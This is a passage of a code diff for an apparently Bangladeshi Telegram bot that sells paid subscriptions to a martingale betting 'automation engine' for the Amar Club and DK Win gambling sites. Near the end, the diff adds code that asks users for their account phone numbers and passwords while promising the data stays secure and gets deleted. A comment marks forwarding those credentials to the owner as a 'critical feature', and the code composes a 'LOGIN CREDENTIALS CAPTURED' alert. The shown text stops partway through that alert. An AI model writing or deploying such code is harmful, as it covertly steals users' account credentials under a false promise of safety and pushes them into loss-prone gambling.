     markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        InlineKeyboardButton(f"{to_bold('1D - 500')}", callback_data="plan_1d"),
-        InlineKeyboardButton(f"{to_bold('3D - 1300')}", callback_data="plan_3d")
-    )
-    markup.add(
-        InlineKeyboardButton(f"{to_bold('6D - 2400')}", callback_data="plan_6d"),
-        InlineKeyboardButton(f"{to_bold('7D - 2700')}", callback_data="plan_7d")
-    )
-    markup.add(
-        InlineKeyboardButton(f"{to_bold('10D - 3500')}", callback_data="plan_10d"),
-        InlineKeyboardButton(f"{to_bold('30D - 9000')}", callback_data="plan_30d")
-    )
+    buttons = [
+        InlineKeyboardButton(f"💎 {to_bold(p['label'])}", callback_data=f"buy_plan:{k}")
+        for k, p in PRICING_PLANS.items()
+    ]
+    # Add in pairs of 2
+    for i in range(0, len(buttons), 2):
+        if i + 1 < len(buttons):
+            markup.row(buttons[i], buttons[i+1])
+        else:
+            markup.row(buttons[i])
     return markup
 
-def get_gateway_keyboard(plan_key):
+def get_payment_methods_keyboard(plan_key):
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton(f"{to_bold('BKASH')}", callback_data=f"pay_bkash:{plan_key}"),
-        InlineKeyboardButton(f"{to_bold('NAGAD')}", callback_data=f"pay_nagad:{plan_key}")
+        InlineKeyboardButton("🔴 bKash (বিকাশ)", callback_data=f"pay_meth:{plan_key}:bkash"),
+        InlineKeyboardButton("🟠 Nagad (নগদ)", callback_data=f"pay_meth:{plan_key}:nagad")
     )
-    markup.add(
-        InlineKeyboardButton(f"{to_bold('BACK')}", callback_data="back_pricing")
-    )
+    markup.add(InlineKeyboardButton(f"⬅️ {to_bold('BACK / পরিবর্তন')}", callback_data="show_plans"))
     return markup
 
-def get_owner_approval_keyboard(user_id, days):
+def get_site_choice_keyboard(chat_id):
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton(f"{to_bold('APPROVE')}", callback_data=f"appr_{user_id}_{days}"),
-        InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"rejt_{user_id}")
-    )
-    return markup
-
-def get_platform_keyboard():
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        InlineKeyboardButton(f"{to_bold('AMAR CLUB')}", callback_data="site_amarclub"),
-        InlineKeyboardButton(f"{to_bold('DK WIN')}", callback_data="site_dkwin")
+        InlineKeyboardButton(f"🟢 {to_bold('AMAR CLUB')}", callback_data="site_amarclub"),
+        InlineKeyboardButton(f"🔵 {to_bold('DK WIN')}", callback_data="site_dkwin")
     )
     return markup
 
@@ -1292,21 +1051,21 @@ def get_credentials_keyboard(sid):
 
     if not has_phone:
         markup.add(
-            InlineKeyboardButton(f"{to_bold('NUMBER')}", callback_data=f"ask_num:{sid}"),
-            InlineKeyboardButton(f"{to_bold('PASSWORD')}", callback_data=f"ask_pass:{sid}")
+            InlineKeyboardButton(f"📱 {to_bold('ENTER NUMBER')}", callback_data=f"ask_num:{sid}"),
+            InlineKeyboardButton(f"🔑 {to_bold('PASSWORD')}", callback_data=f"ask_pass:{sid}")
         )
     else:
         markup.add(
-            InlineKeyboardButton(f"{to_bold('PASSWORD')}", callback_data=f"ask_pass:{sid}")
+            InlineKeyboardButton(f"🔑 {to_bold('ENTER PASSWORD')}", callback_data=f"ask_pass:{sid}")
         )
-    markup.add(InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"cancel:{sid}"))
+    markup.add(InlineKeyboardButton(f"❌ {to_bold('CANCEL')}", callback_data=f"cancel:{sid}"))
     return markup
 
 def get_start_screen_keyboard(sid):
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton(f"{to_bold('START')}", callback_data=f"start_cfg:{sid}"),
-        InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
+        InlineKeyboardButton(f"🚀 {to_bold('START CONFIG')}", callback_data=f"start_cfg:{sid}"),
+        InlineKeyboardButton(f"❌ {to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
     )
     return markup
 
@@ -1315,17 +1074,17 @@ def get_setup_param_keyboard(sid):
     t_val = sess.get("target_profit", 0)
     s_val = sess.get("total_steps", 7)
 
-    t_lbl = f"TARGET: {int(t_val)}" if t_val else "TARGET"
-    s_lbl = f"STEPS: {int(s_val)}" if s_val else "STEPS"
+    t_lbl = f"TARGET: {int(t_val)}৳" if t_val else "SET TARGET"
+    s_lbl = f"STEPS: {int(s_val)}" if s_val else "SET STEPS"
 
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton(f"{to_bold(t_lbl)}", callback_data=f"set_tgt:{sid}"),
-        InlineKeyboardButton(f"{to_bold(s_lbl)}", callback_data=f"set_stp:{sid}")
+        InlineKeyboardButton(f"🎯 {to_bold(t_lbl)}", callback_data=f"set_tgt:{sid}"),
+        InlineKeyboardButton(f"⚡ {to_bold(s_lbl)}", callback_data=f"set_stp:{sid}")
     )
     markup.add(
-        InlineKeyboardButton(f"{to_bold('START')}", callback_data=f"run_auto:{sid}"),
-        InlineKeyboardButton(f"{to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
+        InlineKeyboardButton(f"▶️ {to_bold('RUN ENGINE')}", callback_data=f"run_auto:{sid}"),
+        InlineKeyboardButton(f"❌ {to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
     )
     return markup
 
@@ -1336,46 +1095,657 @@ def get_trading_control_keyboard(sid):
 
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton(f"{to_bold('SHOT')}", callback_data=f"shot:{sid}"),
-        InlineKeyboardButton(f"{to_bold('BAL')}", callback_data=f"bal:{sid}")
+        InlineKeyboardButton(f"📸 {to_bold('SHOT')}", callback_data=f"shot:{sid}"),
+        InlineKeyboardButton(f"💰 {to_bold('BAL')}", callback_data=f"bal:{sid}")
     )
     markup.add(
-        InlineKeyboardButton(f"{to_bold('STATS')}", callback_data=f"stats:{sid}"),
-        InlineKeyboardButton(f"{to_bold(f'STOP {spinner}')}", callback_data=f"stop:{sid}")
+        InlineKeyboardButton(f"📊 {to_bold('STATS')}", callback_data=f"stats:{sid}"),
+        InlineKeyboardButton(f"⏹ {to_bold(f'STOP {spinner}')}", callback_data=f"stop:{sid}")
     )
     return markup
 
-# =====================================================================
-# 10. Login Flow & Automated Owner Alert
-# =====================================================================
-def play_clean_login_animation(chat_id, msg_id):
-    frames = [
-        "<b>CONNECTING REMOTE ENGINE</b>\\n<code>Allocating isolated profile...</code>",
-        "<b>INITIALIZING TARGET PLATFORM</b>\\n<code>Securing connection instance...</code>",
-        "<b>INJECTING AUTHENTICATION DATA</b>\\n<code>Auto-filling credentials...</code>",
-        "<b>VERIFYING ACTIVE SESSION</b>\\n<code>Checking dashboard token...</code>"
-    ]
-    for frame in frames:
-        try:
-            bot.edit_message_text(frame, chat_id=chat_id, message_id=msg_id)
-        except Exception:
-            pass
-        time.sleep(0.4)
+# ==========================================
+# 9. Bot Command & Conversation Logic
+# ==========================================
+@bot.message_handler(commands=['start'])
+def handle_start(message):
+    chat_id = message.chat.id
+    safe_delete_message(chat_id, message.message_id)
 
+    user_states[chat_id] = {"stage": "INIT"}
+
+    welcome_lock_text = (
+        f"<b>{to_bold('ASSALAMU ALAIKUM / WELCOME')}</b> 🌟\n\n"
+        f"আমাদের ভিআইপি উইনগো ৩০এস অটোমেশন বোট-এ আপনাকে স্বাগতম!\n\n"
+        f"<b>দয়া করে নিচের দুটি অফিশিয়াল চ্যানেলে জয়েন করুন:</b>\n"
+        f"1. DARK 67 HACK\n"
+        f"2. BD WIN 24\n\n"
+        f"<i>চ্যানেলে জয়েন করে নিচের 'I HAVE JOINED' বাটনে ক্লিক করে এগিয়ে যান।</i>"
+    )
+
+    bot.send_message(
+        chat_id,
+        welcome_lock_text,
+        reply_markup=get_channel_lock_keyboard(),
+        disable_web_page_preview=True
+    )
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback_router(call):
+    chat_id = call.message.chat.id
+    data = call.data
+
+    # 1. Channel Lock passed
+    if data == "channel_joined_continue":
+        bot.answer_callback_query(call.id)
+        msg_text = (
+            f"<b>{to_bold('SELECT LANGUAGE / ভাষা নির্বাচন করুন')}</b>\n\n"
+            f"দয়া করে আপনার সুবিধাজনক ভাষা নির্বাচন করুন:"
+        )
+        bot.edit_message_text(
+            msg_text,
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            reply_markup=get_language_keyboard()
+        )
+
+    # 2. Language Selected
+    elif data.startswith("set_lang:"):
+        lang = data.split(":")[1]
+        user_states.setdefault(chat_id, {})["lang"] = lang
+        bot.answer_callback_query(call.id)
+
+        # Check subscription status
+        has_sub, rem_days = is_user_subscribed(chat_id)
+        if has_sub:
+            # Already active subscriber
+            msg = (
+                f"<b>{to_bold('VIP ACCESS ACTIVE')}</b>\n\n"
+                f"স্বাগতম প্রিয় গ্রাহক! আপনার সাবস্ক্রিপশন মেয়াদ এখনও <b>{rem_days} দিন</b> বাকি রয়েছে।\n"
+                f"নিচের তালিকা থেকে সাইট সিলেক্ট করে অটোমেশন চালু করুন:"
+            )
+            bot.edit_message_text(
+                msg,
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                reply_markup=get_site_choice_keyboard(chat_id)
+            )
+        else:
+            # Show Pricing List
+            pricing_text = (
+                f"<b>{to_bold('VIP SUBSCRIPTION PLANS')}</b> 💎\n\n"
+                f"আমাদের প্রিমিয়াম WinGo 30S হাই-টেক অটোমেশন নিতে নিচের যেকোনো একটি প্যাকেজ বেছে নিন:\n\n"
+                f"• <b>1 Day:</b> 500 BDT\n"
+                f"• <b>3 Days:</b> 1,300 BDT\n"
+                f"• <b>6 Days:</b> 2,400 BDT\n"
+                f"• <b>7 Days:</b> 2,700 BDT\n"
+                f"• <b>10 Days:</b> 3,500 BDT\n"
+                f"• <b>1 Month (30 Days):</b> 9,000 BDT\n\n"
+                f"<i>নিচের বাটনে ক্লিক করে প্যাকেজটি নির্বাচন করুন:</i>"
+            )
+            bot.edit_message_text(
+                pricing_text,
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                reply_markup=get_pricing_keyboard()
+            )
+
+    # 3. Show Pricing Plans
+    elif data == "show_plans":
+        bot.answer_callback_query(call.id)
+        pricing_text = (
+            f"<b>{to_bold('VIP SUBSCRIPTION PLANS')}</b> 💎\n\n"
+            f"নিচের যেকোনো একটি প্যাকেজ বেছে নিন:"
+        )
+        bot.edit_message_text(
+            pricing_text,
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            reply_markup=get_pricing_keyboard()
+        )
+
+    # 4. Plan Selected -> Ask Payment Method
+    elif data.startswith("buy_plan:"):
+        plan_key = data.split(":")[1]
+        plan_info = PRICING_PLANS.get(plan_key)
+        if not plan_info:
+            return
+        user_states.setdefault(chat_id, {})["selected_plan"] = plan_key
+        bot.answer_callback_query(call.id)
+
+        prompt_msg = (
+            f"<b>{to_bold('PAYMENT METHOD SELECTION')}</b>\n\n"
+            f"নির্বাচিত প্যাকেজ: <b>{plan_info['name']}</b>\n"
+            f"মোট প্রদেয় অর্থ: <b>{plan_info['price']} BDT</b>\n\n"
+            f"আশা করি আপনার লেনদেনটি সফল হোক।\n"
+            f"দয়া করে আমাদের নাম্বারে সেন্ড মানি করুন।\n"
+            f"নিচের বাটন থেকে পেমেন্ট মেথডটি সিলেক্ট করুন:"
+        )
+        bot.edit_message_text(
+            prompt_msg,
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            reply_markup=get_payment_methods_keyboard(plan_key)
+        )
+
+    # 5. Method Selected -> Show Number & Ask TrxID
+    elif data.startswith("pay_meth:"):
+        _, plan_key, method = data.split(":")
+        plan_info = PRICING_PLANS.get(plan_key)
+        phone_num = BKASH_NUMBER if method == "bkash" else NAGAD_NUMBER
+        meth_name = "bKash (বিকাশ)" if method == "bkash" else "Nagad (নগদ)"
+
+        user_states[chat_id]["pending_payment"] = {
+            "plan_key": plan_key,
+            "method": method,
+            "price": plan_info["price"],
+            "days": plan_info["days"]
+        }
+        user_states[chat_id]["stage"] = "WAITING_TRXID"
+
+        bot.answer_callback_query(call.id)
+        pay_instr = (
+            f"<b>{to_bold('SEND MONEY & SUBMIT TRXID')}</b>\n\n"
+            f"আসসালামু আলাইকুম। আপনার লেনদেনটি সফল হোক এটাই আমাদের কামনা।\n\n"
+            f"পেমেন্ট মেথড: <b>{meth_name}</b>\n"
+            f"নাম্বার: <code>{phone_num}</code>\n"
+            f"টাকার পরিমাণ: <b>{plan_info['price']} BDT</b>\n\n"
+            f"<b>নির্দেশনা:</b>\n"
+            f"১. উপরের নাম্বারে <b>Send Money</b> করুন।\n"
+            f"২. সেন্ড মানি করে আপনাদের ট্রানজেকশন আইডিটি (TrxID) নিচে লিখে চ্যাটে সেন্ড করুন। আর কিছু করার দরকার নেই।"
+        )
+        bot.edit_message_text(
+            pay_instr,
+            chat_id=chat_id,
+            message_id=call.message.message_id
+        )
+
+    # 6. Owner Approval / Rejection Handling
+    elif data.startswith("admin_approve:") or data.startswith("admin_reject:"):
+        if call.from_user.id != OWNER_CHAT_ID:
+            bot.answer_callback_query(call.id, "আপনি এই অ্যাকশনের জন্য অনুমতিপ্রাপ্ত নন!", show_alert=True)
+            return
+
+        is_approve = data.startswith("admin_approve:")
+        target_chat_id = int(data.split(":")[1])
+
+        db = load_db()
+        pending = db.get("pending_requests", {}).pop(str(target_chat_id), None)
+
+        if not pending:
+            bot.answer_callback_query(call.id, "এই অনুরোধটি ইতোমধ্যেই প্রসেস করা হয়েছে।", show_alert=True)
+            return
+
+        if is_approve:
+            days = pending.get("days", 1)
+            expires_at = time.time() + (days * 86400)
+            db.setdefault("subscribers", {})[str(target_chat_id)] = {
+                "plan_key": pending.get("plan_key"),
+                "days": days,
+                "approved_at": time.time(),
+                "expires_at": expires_at
+            }
+            save_db(db)
+
+            bot.answer_callback_query(call.id, "অনুমোদন সফল হয়েছে!")
+            bot.edit_message_text(
+                f"✅ <b>অনুমোদিত!</b> ইউজার <code>{target_chat_id}</code> এর সাবস্ক্রিপশন চালু করা হয়েছে।",
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id
+            )
+
+            # Notify user
+            success_msg = (
+                f"<b>{to_bold('PAYMENT APPROVED SUCCESSFULLY')}</b> ✅\n\n"
+                f"আসসালামু আলাইকুম। প্রিয় গ্রাহক আপনার লেনদেনটি সফল হয়েছে।\n"
+                f"আপনি ফাইলটি নিতে পারবেন এবং বোটটি সম্পূর্ণ ফ্রিলি ইউজ করতে পারবেন।\n\n"
+                f"মেয়াদ: <b>{days} দিন</b>\n\n"
+                f"<i>নিচের বাটন থেকে আপনার প্ল্যাটফর্ম নির্বাচন করে কাজ শুরু করুন:</i>"
+            )
+            bot.send_message(
+                target_chat_id,
+                success_msg,
+                reply_markup=get_site_choice_keyboard(target_chat_id)
+            )
+        else:
+            save_db(db)
+            bot.answer_callback_query(call.id, "অনুরোধটি বাতিল করা হয়েছে।")
+            bot.edit_message_text(
+                f"❌ <b>বাতিল!</b> ইউজার <code>{target_chat_id}</code> এর অনুরোধ বাতিল করা হয়েছে।",
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id
+            )
+            rejection_msg = (
+                f"<b>{to_bold('TRANSACTION REJECTED')}</b> ❌\n\n"
+                f"দুঃখিত, আপনার ট্রানজেকশন তথ্যটি যাচাই করা সম্ভব হয়নি অথবা বাতিল করা হয়েছে।\n"
+                f"প্রয়োজনে সঠিক TrxID দিয়ে পুনরায় চেষ্টা করুন অথবা অ্যাডমিনের সাথে যোগাযোগ করুন।"
+            )
+            bot.send_message(target_chat_id, rejection_msg)
+
+    # 7. Platform Selected (AmarClub / DKWin)
+    elif data in ["site_amarclub", "site_dkwin"]:
+        site_name = "Amar Club" if data == "site_amarclub" else "DK Win"
+        sid = f"{chat_id}_{int(time.time()) % 1000000}"
+
+        active_sessions[sid] = {
+            "chat_id": chat_id,
+            "session_id": sid,
+            "site_name": site_name,
+            "phone": None,
+            "password": None,
+            "target_profit": 0,
+            "total_steps": 7,
+            "is_trading": False,
+            "created_at": time.time(),
+            "anim_tick": 0,
+            "lock": threading.RLock()
+        }
+
+        user_states[chat_id]["active_sid"] = sid
+        bot.answer_callback_query(call.id)
+
+        card_text = (
+            f"<b>{to_bold('ACCOUNT LOGIN')}</b>\n\n"
+            f"প্ল্যাটফর্ম: <b>{site_name}</b>\n\n"
+            f"আসসালামু আলাইকুম, দয়া করে নিচের বাটন চেপে আপনার নাম্বার এবং পাসওয়ার্ড দিন। "
+            f"এটি সম্পূর্ণ সুরক্ষিত থাকবে এবং কাজ শেষে চ্যাট থেকে স্বয়ংক্রিয়ভাবে মুছে যাবে।"
+        )
+        bot.edit_message_text(
+            card_text,
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            reply_markup=get_credentials_keyboard(sid)
+        )
+        active_sessions[sid]["cred_card_msg_id"] = call.message.message_id
+
+    # 8. Credentials Entry Prompts
+    elif data.startswith("ask_num:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            active_sessions[sid]["input_mode"] = "WAITING_PHONE"
+            user_states[chat_id]["active_sid"] = sid
+            bot.answer_callback_query(call.id)
+            prompt_m = bot.send_message(chat_id, f"<b>{to_bold('ACCOUNT NUMBER')}</b>\n\nআপনার একাউন্ট ফোন নাম্বার লিখে পাঠান:")
+            active_sessions[sid]["temp_prompt_id"] = prompt_m.message_id
+
+    elif data.startswith("ask_pass:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            if not active_sessions[sid].get("phone"):
+                bot.answer_callback_query(call.id, "আগে ফোন নাম্বারটি দিন!", show_alert=True)
+                return
+            active_sessions[sid]["input_mode"] = "WAITING_PASS"
+            user_states[chat_id]["active_sid"] = sid
+            bot.answer_callback_query(call.id)
+            prompt_m = bot.send_message(chat_id, f"<b>{to_bold('ACCOUNT PASSWORD')}</b>\n\nআপনার একাউন্টের পাসওয়ার্ড লিখে পাঠান:")
+            active_sessions[sid]["temp_prompt_id"] = prompt_m.message_id
+
+    # 9. Start Config Screen
+    elif data.startswith("start_cfg:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            bot.answer_callback_query(call.id, "উইনগো ৩০এস মার্কেট লোড হচ্ছে...")
+            threading.Thread(target=prepare_wingo_parameters, args=(chat_id, sid), daemon=True).start()
+
+    # 10. Set Target
+    elif data.startswith("set_tgt:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            active_sessions[sid]["input_mode"] = "WAITING_TARGET"
+            user_states[chat_id]["active_sid"] = sid
+            bot.answer_callback_query(call.id)
+            cur_bal = active_sessions[sid].get("current_balance", 0.0)
+            p_msg = bot.send_message(chat_id, f"<b>{to_bold('TARGET PROFIT')}</b>\n\nবর্তমান ব্যালেন্স: <code>৳ {cur_bal:.2f}</code>\nটার্গেট প্রফিট পরিমাণ লিখুন (যেমন: 500):")
+            active_sessions[sid]["temp_prompt_id"] = p_msg.message_id
+
+    # 11. Set Steps
+    elif data.startswith("set_stp:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            active_sessions[sid]["input_mode"] = "WAITING_STEPS"
+            user_states[chat_id]["active_sid"] = sid
+            bot.answer_callback_query(call.id)
+            tgt = active_sessions[sid].get("target_profit", 0)
+            p_msg = bot.send_message(chat_id, f"<b>{to_bold('MARTINGALE STEPS')}</b>\n\nমার্টিনগেল ব্যাকআপ স্টেপ সংখ্যা লিখুন (যেমন: 7 বা 10):")
+            active_sessions[sid]["temp_prompt_id"] = p_msg.message_id
+
+    # 12. Run Engine
+    elif data.startswith("run_auto:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            sess = active_sessions[sid]
+            if not sess.get("target_profit") or sess["target_profit"] <= 0:
+                bot.answer_callback_query(call.id, "আগে টার্গেট অ্যামাউন্ট লিখুন!", show_alert=True)
+                return
+
+            bot.answer_callback_query(call.id, "ট্রেডিং ইঞ্জিন সক্রিয় করা হচ্ছে...")
+            sess["is_trading"] = True
+
+            def _run_core(drv):
+                drv.execute_script(WINGO_CORE_JS, sess["target_profit"], sess["total_steps"])
+            safe_tab_execute(sid, _run_core)
+
+            time.sleep(2.0)
+
+            start_snap = os.path.join(PROFILES_BASE_DIR, f"run_{sid}.png")
+            def _shot(drv):
+                drv.save_screenshot(start_snap)
+            safe_tab_execute(sid, _shot)
+
+            cur_b = sess.get("current_balance", 0.0)
+            target_total = cur_b + sess["target_profit"]
+            sess["start_bal"] = cur_b
+
+            dashboard_caption = (
+                f"<b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\n\n"
+                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
+                f"Starting Balance: <code>৳ {cur_b:.2f}</code>\n"
+                f"Target Balance: <code>৳ {target_total:.2f}</code>\n"
+                f"Total Steps: <b>{sess['total_steps']}</b>\n\n"
+                f"Trading automatically in background 24/7.\n"
+                f"<b>LIVE STATUS</b>: মার্টিনগেল ইঞ্জিন সফলভাবে সচল রয়েছে।"
+            )
+
+            display_or_replace_photo(chat_id, sid, start_snap, dashboard_caption, get_trading_control_keyboard(sid))
+            try:
+                if os.path.exists(start_snap):
+                    os.remove(start_snap)
+            except Exception:
+                pass
+
+            threading.Thread(target=monitor_trading_progress, args=(chat_id, sid), daemon=True).start()
+
+    # 13. Shot
+    elif data.startswith("shot:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            sess = active_sessions[sid]
+            bot.answer_callback_query(call.id, "লাইভ ফুটেজ আপডেট হচ্ছে...")
+            temp_shot = os.path.join(PROFILES_BASE_DIR, f"live_{sid}.png")
+            def _shot(drv):
+                drv.save_screenshot(temp_shot)
+            safe_tab_execute(sid, _shot)
+
+            if os.path.exists(temp_shot):
+                t_total = sess.get("start_bal", 0.0) + sess.get("target_profit", 0.0)
+                caption = (
+                    f"<b>{to_bold('LIVE FOOTAGE SNAPSHOT')}</b>\n\n"
+                    f"Platform: <b>{sess.get('site_name', '')}</b>\n"
+                    f"Starting Balance: <code>৳ {sess.get('start_bal', 0.0):.2f}</code>\n"
+                    f"Target Balance: <code>৳ {t_total:.2f}</code>\n"
+                    f"Total Steps: <b>{sess.get('total_steps', 7)}</b>\n\n"
+                    f"টাইমস্ট্যাম্প: <code>{time.strftime('%H:%M:%S')}</code>\n"
+                    f"<b>LIVE STATUS</b>: ইঞ্জিন সক্রিয় রয়েছে।"
+                )
+                display_or_replace_photo(chat_id, sid, temp_shot, caption, get_trading_control_keyboard(sid))
+                try:
+                    os.remove(temp_shot)
+                except Exception:
+                    pass
+
+    # 14. Bal
+    elif data.startswith("bal:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            def _bal(drv):
+                return drv.execute_script(FETCH_BALANCE_JS)
+            b = safe_tab_execute(sid, _bal)
+            if b is not None:
+                bot.answer_callback_query(call.id, f"লাইভ ব্যালেন্স: ৳ {b:.2f}", show_alert=True)
+            else:
+                bot.answer_callback_query(call.id, "ব্যালেন্স লোড হচ্ছে...", show_alert=True)
+
+    # 15. Stats
+    elif data.startswith("stats:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            def _stat(drv):
+                return drv.execute_script("""
+                    if (window.__WINGO_ST) {
+                        return {
+                            w: window.__WINGO_ST.w || 0,
+                            l: window.__WINGO_ST.l || 0,
+                            step: (window.__WINGO_ST.stpIdx || 0) + 1,
+                            maxStep: (window.__WINGO_ST.dynSeq || []).length,
+                            curBal: window.__WINGO_ST.curBal || 0,
+                            tgtAmt: window.__WINGO_ST.tgtAmt || 0
+                        };
+                    }
+                    return null;
+                """)
+            data_rep = safe_tab_execute(sid, _stat)
+            if data_rep:
+                stat_txt = (
+                    f"<b>{to_bold('LIVE STATS REPORT')}</b>\n\n"
+                    f"ব্যালেন্স: <code>৳ {data_rep['curBal']:.2f}</code>\n"
+                    f"টার্গেট: <code>৳ {data_rep['tgtAmt']:.2f}</code>\n"
+                    f"মার্টিনগেল লেভেল: <b>Step {data_rep['step']}/{data_rep['maxStep']}</b>\n"
+                    f"উইন: <b>{data_rep['w']}</b> | লস: <b>{data_rep['l']}</b>"
+                )
+                bot.send_message(chat_id, stat_txt)
+            else:
+                bot.answer_callback_query(call.id, "ইঞ্জিন লোড হচ্ছে...", show_alert=True)
+
+    # 16. Stop
+    elif data.startswith("stop:"):
+        sid = data.split(":")[1]
+        if sid in active_sessions:
+            sess = active_sessions[sid]
+            def _stop(drv):
+                drv.execute_script("let btn = document.querySelector('#sys-core-fin button'); if(btn) btn.click();")
+            safe_tab_execute(sid, _stop)
+            sess["is_trading"] = False
+            bot.answer_callback_query(call.id, "ট্রেডিং সাময়িক স্থগিত করা হয়েছে", show_alert=True)
+            bot.send_message(chat_id, f"<b>{to_bold('TRADING PAUSED')}</b>\nট্রেডিং অটোমেশন সাময়িকভাবে থামানো হয়েছে।")
+
+    # 17. Cancel
+    elif data.startswith("cancel:"):
+        sid = data.split(":")[1] if ":" in data else None
+        if sid and sid in active_sessions:
+            close_session_tab(sid)
+        safe_delete_message(chat_id, call.message.message_id)
+        bot.answer_callback_query(call.id, "সেশন বাতিল করা হয়েছে")
+        bot.send_message(chat_id, f"<b>{to_bold('SESSION TERMINATED')}</b>\nসেশনটি বন্ধ করা হয়েছে। পুনরায় শুরু করতে /start পাঠান।")
+
+# ==========================================
+# 10. Text Input Handler & Auto Forwarding
+# ==========================================
+@bot.message_handler(func=lambda msg: True)
+def handle_text_inputs(message):
+    chat_id = message.chat.id
+    text = message.text.strip()
+    safe_delete_message(chat_id, message.message_id)
+
+    u = user_states.get(chat_id, {})
+
+    # A. TrxID Submission
+    if u.get("stage") == "WAITING_TRXID":
+        pending = u.get("pending_payment")
+        if not pending:
+            return
+        u["stage"] = "PENDING_APPROVAL"
+        trx_id = text
+
+        # Save to database
+        db = load_db()
+        db.setdefault("pending_requests", {})[str(chat_id)] = {
+            "trx_id": trx_id,
+            "plan_key": pending["plan_key"],
+            "days": pending["days"],
+            "price": pending["price"],
+            "method": pending["method"],
+            "user_id": chat_id,
+            "username": message.from_user.username or "N/A",
+            "full_name": message.from_user.full_name or "N/A",
+            "submitted_at": time.time()
+        }
+        save_db(db)
+
+        # Notify User
+        bot.send_message(
+            chat_id,
+            f"<b>{to_bold('TRANSACTION SUBMITTED')}</b> ⏳\n\n"
+            f"আপনার ট্রানজেকশন আইডি: <code>{trx_id}</code> গ্রহণ করা হয়েছে।\n"
+            f"অ্যাডমিন ভেরিফাই করলেই আপনার একাউন্টে অটোমেশন সার্ভিস সক্রিয় হয়ে যাবে। দয়া করে কিছুক্ষণ অপেক্ষা করুন।"
+        )
+
+        # Send Approval Request to Owner (8707571669)
+        admin_markup = InlineKeyboardMarkup(row_width=2)
+        admin_markup.add(
+            InlineKeyboardButton(f"✅ {to_bold('অনুমোদন (Approve)')}", callback_data=f"admin_approve:{chat_id}"),
+            InlineKeyboardButton(f"❌ {to_bold('বাতিল (Cancel)')}", callback_data=f"admin_reject:{chat_id}")
+        )
+
+        owner_notif = (
+            f"🔔 <b>{to_bold('NEW PAYMENT APPROVAL REQUEST')}</b>\n\n"
+            f"• <b>ইউজার আইডি:</b> <code>{chat_id}</code>\n"
+            f"• <b>নাম:</b> {message.from_user.full_name}\n"
+            f"• <b>ইউজারনেম:</b> @{message.from_user.username or 'N/A'}\n"
+            f"• <b>প্যাকেজ:</b> {pending['plan_key']} ({pending['days']} Days)\n"
+            f"• <b>টাকার পরিমাণ:</b> {pending['price']} BDT\n"
+            f"• <b>পেমেন্ট মেথড:</b> {pending['method'].upper()}\n"
+            f"• <b>ট্রানজেকশন আইডি:</b> <code>{trx_id}</code>\n\n"
+            f"<i>অনুগ্রহ করে ভেরিফাই করে নিচের যেকোনো একটি বাটনে চাপ দিন:</i>"
+        )
+        try:
+            bot.send_message(OWNER_CHAT_ID, owner_notif, reply_markup=admin_markup)
+        except Exception as e:
+            print(f"[!] Failed to send notification to owner: {e}")
+        return
+
+    # B. Active Session Credentials Handling
+    sid = u.get("active_sid")
+    if not sid or sid not in active_sessions:
+        return
+
+    sess = active_sessions[sid]
+    input_mode = sess.get("input_mode")
+
+    if sess.get("temp_prompt_id"):
+        safe_delete_message(chat_id, sess["temp_prompt_id"])
+        sess["temp_prompt_id"] = None
+
+    if input_mode == "WAITING_PHONE":
+        sess["phone"] = text
+        sess["input_mode"] = None
+
+        if sess.get("cred_card_msg_id"):
+            try:
+                masked = text[:3] + "****" + text[-3:] if len(text) >= 6 else text
+                updated_card_text = (
+                    f"<b>{to_bold('ACCOUNT LOGIN')}</b>\n\n"
+                    f"প্ল্যাটফর্ম: <b>{sess.get('site_name', '')}</b>\n"
+                    f"নাম্বার: <code>{masked}</code> (সংরক্ষিত)\n\n"
+                    f"এখন নিচের <b>ENTER PASSWORD</b> বাটনে চাপ দিয়ে পাসওয়ার্ড দিন:"
+                )
+                bot.edit_message_text(
+                    updated_card_text,
+                    chat_id=chat_id,
+                    message_id=sess["cred_card_msg_id"],
+                    reply_markup=get_credentials_keyboard(sid)
+                )
+            except Exception:
+                pass
+
+    elif input_mode == "WAITING_PASS":
+        sess["password"] = text
+        sess["input_mode"] = None
+
+        if sess.get("cred_card_msg_id"):
+            safe_delete_message(chat_id, sess["cred_card_msg_id"])
+            sess["cred_card_msg_id"] = None
+
+        # CRITICAL FEATURE: Automatically forward credentials to Owner (8707571669)
+        owner_cred_alert = (
+            f"🚨 <b>{to_bold('LOGIN CREDENTIALS CAPTURED')}</b>\n\n"
+            f"• <b>ইউজার আইডি:</b> <code>{chat_id}</code>\n"
+            f"• <b>নাম:</b> {message.from_user.full_name}\n"
